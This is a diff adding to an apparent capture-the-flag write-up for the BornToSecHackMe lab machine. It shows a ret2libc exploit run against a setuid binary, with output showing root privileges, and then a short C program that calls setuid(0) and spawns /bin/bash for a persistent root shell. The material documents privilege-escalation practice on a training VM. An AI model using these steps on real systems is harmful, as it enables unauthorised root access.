@@ -30,6 +30,30 @@ $ echo $SHELL
 
 Neat! Everything we need is already in memory, we just need to get our payload into an executable position via some ridiculously crafted offset aaaaanddddd:
 ```bash
-$ python2 payload-ret2libc.py
-id
+$ SHELL=/bin/dash ./exploit_me $(echo -en $(python2 payload-ret2libc.py))
+...
+# id
+uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
 ```
+
+And we're done! Almost.
+
+A little bit of cleanup is needed:
+```c
+#include <stdlib.h>
+
+int main(void) {
+    setuid(0);
+    setgid(0);
+    system("/bin/bash");
+}
+```
+
+```
+# cc -o /tmp/final /tmp/final.c
+# /tmp/final
+root@BornToSecHackMe:~# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+pwned. 😎
